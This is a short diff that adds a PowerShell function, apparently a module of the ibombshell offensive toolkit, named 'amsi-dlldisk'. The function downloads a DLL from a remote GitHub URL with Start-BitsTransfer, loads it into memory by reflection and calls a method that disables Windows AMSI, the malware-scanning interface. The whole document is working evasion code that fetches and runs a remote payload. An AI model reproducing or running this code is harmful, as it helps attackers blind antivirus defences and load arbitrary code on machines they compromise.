@@ -1,0 +1,17 @@
+function amsi-dlldisk {
+       param(
+            [Parameter(Mandatory=$false)]
+            [string] $dll = 'https://raw.githubusercontent.com/Telefonica/ibombshell/master/data/files/amsi-surprise.dll'
+        )
+
+    $output = $pwd
+    try{    
+    	Start-BitsTransfer -Source $dll -Destination $output
+	    [Reflection.Assembly]::Load([IO.File]::ReadAllBytes($output.Path+"\amsi-surprise.dll"))
+     } catch {
+         printMessage -message "$_.Exception.Message" 
+     }
+
+    return [Bypass.AMSI]::Disable()
+
+}
